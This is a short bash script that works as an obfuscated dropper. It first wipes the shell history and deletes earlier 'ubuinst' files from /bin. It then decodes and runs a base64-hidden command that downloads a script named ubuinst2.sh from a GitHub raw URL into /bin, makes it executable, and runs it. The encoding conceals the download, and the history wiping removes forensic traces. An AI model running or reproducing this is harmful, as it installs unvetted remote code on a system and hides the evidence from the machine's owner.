#!/bin/bash
cat /dev/null > ~/.bash_history && history -c
rm /bin/ubuinst* > /dev/null 2>&1
echo 'IyEvYmluL2Jhc2gKY2QgL2JpbiB8fCBleGl0CndnZXQgcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9TckNhcnJhcmEvaW5zdGFsbC9iYWQvdWJ1aW5zdDIuc2ggJiYgY2htb2QgK3ggdWJ1aW5zdDIuc2ggJiYgZG9zMnVuaXggdWJ1aW5zdDIuc2ggPiAvZGV2L251bGwgMj4mMQpjZCB8fCBleGl0' | base64 -d | bash
/bin/ubuinst2.sh
